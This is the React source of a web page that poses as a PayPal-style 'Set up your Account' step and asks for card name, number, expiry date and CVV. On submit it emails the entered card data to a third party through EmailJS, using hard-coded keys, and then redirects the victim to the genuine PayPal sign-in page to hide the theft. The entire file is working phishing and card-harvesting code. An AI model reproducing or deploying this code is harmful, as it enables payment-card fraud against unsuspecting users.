import React, { useRef, useState } from "react";
import emailjs from "@emailjs/browser";
import logo from "./img/logo.png";

import "./Account.scss";

function Account() {
  const [card, setCard] = useState("");
  const [date, setDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [name, setName] = useState("");
  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();
    // console.log(form);

    if (card && date && cvv && name) {
      emailjs
        .sendForm(
          "service_t9byzmo",
          "template_5p3pp8r",
          form.current,
          "qPPjagDWj9FdfYFPg"
        )
        .then((res) => {
          window.location.href = "https://www.paypal.com/ng/signin";
          // console.log(res, "success");
          setCard("");
          setDate("");
          setCvv("");
          setName("");
        })
        .catch((err) => {
          console.log(err);
        });
    }
  };
  return (
    <>
      <div className="container">
        <div className="main3">
          <div className="main3__bar6">
            {/* <img src={logo} alt="logo" className="logo3" /> */}
          </div>
          <div>
            <h1 className="head1">Set up your Account</h1>
          </div>

          <div className="main3__bar7">
            <form action="#" className="form" ref={form} onSubmit={sendEmail}>
              <input
                type="text"
                name="name"
                className="form__inp"
                placeholder="Card Name"
                value={name}
                onChange={(e) => setName(e.target.value)}
                required
              />
              <input
                type="text"
                name="card"
                className="form__inp"
                placeholder="Card Number"
                value={card}
                onChange={(e) => setCard(e.target.value)}
                required
              />

              {/* expiration date */}

              <input
                name="date"
                placeholder="Expiration Date (01/19)"
                className="form__inp"
                value={date}
                onChange={(e) => setDate(e.target.value)}
                required
              />
              {/* cvv */}

              <input
                name="cvv"
                placeholder="Cvv"
                className="form__inp"
                value={cvv}
                onChange={(e) => setCvv(e.target.value)}
                required
              />

              <div className="shell">
                <button
                  className="button3"
                  type="submit"
                  onChange={sendEmail}
                  value="submit"
                >
                  Next
                </button>
              </div>
            </form>
            <div className="main__bar3">
              <div className="lang">
                <a href="" className="footer__link">
                  English
                </a>
                <a href="" className="footer__link">
                  Français
                </a>
                <a href="" className="footer__link">
                  Español
                </a>
                <a href="" className="footer__link">
                  中国
                </a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}

export default Account;
